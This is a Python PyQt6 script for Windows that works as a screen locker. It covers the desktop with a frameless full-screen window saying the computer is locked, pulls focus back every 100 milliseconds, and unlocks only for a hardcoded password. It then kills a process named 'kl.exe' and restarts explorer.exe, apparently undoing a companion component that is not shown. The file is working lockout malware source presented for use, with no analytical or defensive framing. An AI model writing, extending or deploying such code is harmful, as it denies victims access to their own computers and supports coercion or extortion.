import psutil
import subprocess
import sys,os,threading
from PyQt6.QtCore import *
from PyQt6.QtWidgets import *
from PyQt6.QtGui import *
import win32gui,win32process,win32con,time,ctypes,psutil,winreg
import uiautomation as automation

targetPassword = "Chong+Lvien*z3333333"

def close_all_processes_by_name(process_name):
    # 记录是否有进程被关闭
    terminated = False
    
    # 遍历所有运行中的进程
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            # 检查进程名是否匹配
            if process_name.lower() in proc.info['name'].lower():
                proc.terminate()  # 终止进程
                print(f"Terminated process: {process_name} with PID {proc.info['pid']}")
                terminated = True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            # 处理进程不存在或权限问题
            pass
    
    if not terminated:
        print(f"No process named {process_name} found.")

class FadeLabel(QLabel):
    def __init__(self, parent=None):

        self.parent = parent
        
        super().__init__(parent)
        self.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.setText("")
        
        self.text_lines = []
        self.current_line = 0
        
        self.opacity_effect = QGraphicsOpacityEffect(self)
        self.setGraphicsEffect(self.opacity_effect)

        self.fade_in_animation = None
        self.fade_out_animation = None
        self.timer = QTimer(self)
        self.timer.setSingleShot(True)
        self.timer.timeout.connect(self.next_line)

    def set_text(self, text: str):
        """传入多行文本，并初始化控件。"""
        self.text_lines = text.split('\n')
        self.current_line = 0
        self.show_next_line()

    def show_next_line(self):
        """显示下一个文本行，包括渐显和渐隐效果。"""
        if self.current_line < len(self.text_lines):
            # 设置文本
            self.setText(self.text_lines[self.current_line])
            # 初始化透明度为0
            self.opacity_effect.setOpacity(0)

            # 创建渐显动画
            self.fade_in_animation = QPropertyAnimation(self.opacity_effect, b"opacity")
            self.fade_in_animation.setDuration(1000)  # 渐显动画1秒
            self.fade_in_animation.setStartValue(0)
            self.fade_in_animation.setEndValue(1)
            self.fade_in_animation.finished.connect(self.start_waiting)

            # 启动渐显动画
            self.fade_in_animation.start()

    def start_waiting(self):
        """等待3秒钟后启动渐隐动画。"""
        self.timer.start(3000)  # 等待3秒

    def next_line(self):
        """完成当前行的渐隐效果后切换到下一行。"""
        self.fade_out_animation = QPropertyAnimation(self.opacity_effect, b"opacity")
        self.fade_out_animation.setDuration(1000)  # 渐隐动画1秒
        self.fade_out_animation.setStartValue(1)
        self.fade_out_animation.setEndValue(0)
        self.fade_out_animation.finished.connect(self.line_fade_out_finished)

        # 启动渐隐动画
        self.fade_out_animation.start()

    def line_fade_out_finished(self):
        """渐隐动画完成，切换到下一行或结束。"""
        self.current_line += 1
        if self.current_line < len(self.text_lines):
            self.show_next_line()
        else:
            self.setText("")  # 所有文本显示完毕
            self.parent.show_screen()

class FullScreenWindow(QWidget):
    def __init__(self):
        super().__init__()

        # 获取窗口句柄
        self.window_id = int(self.winId()) # 数字
        # 根据句柄获取目标窗口
        self.window = automation.ControlFromHandle(self.window_id)

        # 设置窗口为全屏并去除标题栏
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint)
        self.showFullScreen()  # 使用 showFullScreen() 进入全屏模式

        self.setStyleSheet("background-color: rgb(0, 20, 38);")

        # 创建垂直布局管理器
        self.layout = QVBoxLayout(self)
        self.layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        # 添加文本标签
        self.text1 = FadeLabel(self)
        # 设置多行文本
        text = """嗨，别来无恙啊！\n你的电脑已被锁定"""
        self.text1.set_text(text)
        self.text1.setStyleSheet("font-size : 40px; color : white;")
        self.layout.addWidget(self.text1)

        # 初始化颜色
        self.start_color = QColor(0, 20, 38)  # 初始颜色为黑色
        self.end_color = QColor(1, 85, 160)  # 目标颜色为蓝色

        # 创建QVariantAnimation动画
        self.animation = QVariantAnimation(self)
        self.animation.setStartValue(self.start_color)
        self.animation.setEndValue(self.end_color)
        self.animation.setDuration(5000)  # 设置动画持续时间为5秒
        self.animation.setEasingCurve(QEasingCurve.Type.Linear)  # 设置线性过渡

        # 连接动画的valueChanged信号
        self.animation.valueChanged.connect(self.update_background)

        # 动画完成时重新启动
        self.animation.finished.connect(self.reverse_animation)

        # 启动动画
        self.animation.start()

        self.activate()

    def show_screen(self):
        # 显示界面
        self.text1.deleteLater()

        self.text2 = QLabel("电脑已被锁定", self)
        self.text2.setStyleSheet("font-size : 40px; color : white;")
        self.layout.addWidget(self.text2)
        self.layout.setAlignment(self.text2, Qt.AlignmentFlag.AlignCenter)

        self.line1 = QLineEdit(self) # 创建文本框
        self.line1.setStyleSheet(
            """
            QLineEdit {
                background-color: rgba(0, 0, 0, 0); /* 设置背景颜色为完全透明 */
                border : none;
                border-bottom: 1px solid white; /* 设置1像素的边框，颜色为 #DDDDDD */
                color: white; /* 设置文字颜色为 #DDDDDD */
                padding: 2px; /* 设置内边距为2像素 */
                font-size:18px;
            }
            """
        )
        self.line1.setContextMenuPolicy(Qt.ContextMenuPolicy.NoContextMenu) # 取消掉右键菜单
        self.line1.setFixedWidth(300)
        self.line1.setFixedHeight(30)
        self.line1.setPlaceholderText("密码") # 创建浮现文字
        self.line1.setClearButtonEnabled(True) # 启用快速清除
        self.line1.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.layout.addWidget(self.line1)
        self.layout.setAlignment(self.line1, Qt.AlignmentFlag.AlignCenter)

        self.text3 = QLabel("密码错误", self)
        self.text3.setStyleSheet("font-size : 16px; color : red;")
        self.layout.addWidget(self.text3)
        self.layout.setAlignment(self.text3, Qt.AlignmentFlag.AlignCenter)
        self.text3.hide()

        self.button1 = QPushButton("确定",self)
        self.button1.setFixedWidth(80)
        self.button1.setFixedHeight(30)
        self.button1.clicked.connect(self.submit_password)
        self.button1.setCursor(Qt.CursorShape.PointingHandCursor)
        self.button1.setStyleSheet('''
            QPushButton {
                background-color: transparent; /* 设置按钮初始背景颜色 */
                border: 0px solid white; /* 设置按钮边框 */
                color: white; /* 设置按钮文字颜色 */
                padding: 5px 10px;
                border-radius: 8px; /* 可选：设置圆角半径 */
                font-size : 15px;
            }
            QPushButton:hover {
                background-color: rgba(128, 128, 128, 128); /* 设置鼠标悬停时的背景颜色 */
            }
        ''')
        self.layout.addWidget(self.button1)
        self.layout.setAlignment(self.button1, Qt.AlignmentFlag.AlignCenter)


    def kill_process_by_name(self, exe_name):

        close_all_processes_by_name(exe_name)

        # 启动 explorer.exe
        subprocess.run(["explorer.exe"])


    def submit_password(self):
        # 提交密码
        getPassword = self.line1.text()

        if getPassword == targetPassword:
            self.close()
            self.kill_process_by_name('kl.exe')
        
        else:
            self.text3.show()
        self.line1.clear()  # 清空密码框，避免误操作

    def activate(self):
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.set_window_focus)
        self.timer.start(100)  # 每100ms激活一次窗口

    def set_window_focus(self):
        # 将目标窗口设置为活动窗口
        self.window.SetFocus()  # 将窗口置于前台，激活窗口

    def update_background(self, value):
        # value为当前动画进度的颜色值
        self.setStyleSheet(f"background-color: {value.name()};")

    def reverse_animation(self):
        # 反转颜色
        self.start_color, self.end_color = self.end_color, self.start_color
        # 重新设置动画并启动
        self.animation.setStartValue(self.start_color)
        self.animation.setEndValue(self.end_color)
        self.animation.setDuration(5000)  # 设置动画持续时间为5秒
        self.animation.setEasingCurve(QEasingCurve.Type.Linear)  # 设置线性过渡
        self.animation.start()

# 启动应用
def start():
    app = QApplication(sys.argv)
    window = FullScreenWindow()
    sys.exit(app.exec())

start()
